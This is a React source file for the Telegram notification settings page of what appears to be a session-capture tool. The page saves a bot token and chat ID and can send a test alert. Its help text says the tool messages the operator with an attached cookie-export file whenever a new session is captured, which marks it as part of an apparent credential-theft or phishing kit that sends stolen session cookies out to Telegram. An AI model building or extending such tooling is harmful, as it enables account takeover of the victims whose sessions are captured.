import React, { useEffect, useState } from 'react';
import { api } from '../lib/api.js';
import Info from '../components/Info.jsx';

export default function Notifications() {
  const [token, setToken] = useState('');
  const [chatId, setChatId] = useState('');
  const [enabled, setEnabled] = useState(false);
  const [saved, setSaved] = useState(false);
  const [error, setError] = useState('');
  const [testResult, setTestResult] = useState('');
  const [testing, setTesting] = useState(false);

  function refresh() {
    api.get('/api/notify/config').then((d) => {
      setToken(d.token || '');
      setChatId(d.chatId || '');
      setEnabled(!!d.enabled);
    }).catch((e) => setError(e.message));
  }
  useEffect(refresh, []);

  async function save(overrides = {}) {
    setError('');
    setSaved(false);
    try {
      const body = { token, chatId, enabled, ...overrides };
      const next = await api.put('/api/notify/config', body);
      setToken(next.token || '');
      setChatId(next.chatId || '');
      setEnabled(!!next.enabled);
      setSaved(true);
    } catch (e) {
      setError(e.message);
    }
  }

  async function sendTest() {
    setTesting(true);
    setTestResult('');
    setError('');
    try {
      await api.post('/api/notify/test');
      setTestResult('Sent — check Telegram.');
    } catch (e) {
      setError(e.message);
    } finally {
      setTesting(false);
    }
  }

  return (
    <div className="stack">
      <h2>Notifications <Info text="Sends a Telegram message (with a cookie-export file attached, when available) whenever a new session is captured. Polls every 15 seconds." /></h2>
      {error && <div className="error-text">{error}</div>}

      <div className="card stack">
        <h3 style={{ margin: 0 }}>
          Telegram <Info text="Create a bot via @BotFather to get a token, then message your bot once and check https://api.telegram.org/bot<token>/getUpdates to find your chat ID." />
        </h3>
        <div className="row wrap">
          <label className="stack" style={{ gap: 2, flex: 1, minWidth: 240 }}>
            <span className="dim" style={{ fontSize: 11 }}>Bot token</span>
            <input type="password" value={token} onChange={(e) => { setToken(e.target.value); setSaved(false); }} placeholder="123456:ABC-DEF..." />
          </label>
          <label className="stack" style={{ gap: 2, flex: 1, minWidth: 180 }}>
            <span className="dim" style={{ fontSize: 11 }}>Chat ID</span>
            <input value={chatId} onChange={(e) => { setChatId(e.target.value); setSaved(false); }} placeholder="e.g. 123456789" />
          </label>
        </div>
        <label className="row" style={{ gap: 6 }}>
          <input type="checkbox" checked={enabled} onChange={(e) => { setEnabled(e.target.checked); setSaved(false); }} />
          <span className="dim">Enabled</span>
        </label>
        <div className="row">
          {saved && <span className="dim">Saved</span>}
          <button className="primary" onClick={() => save()}>Save</button>
          <button onClick={sendTest} disabled={testing}>{testing ? 'Sending...' : 'Send test notification'}</button>
          {testResult && <span className="dim">{testResult}</span>}
        </div>
      </div>
    </div>
  );
}
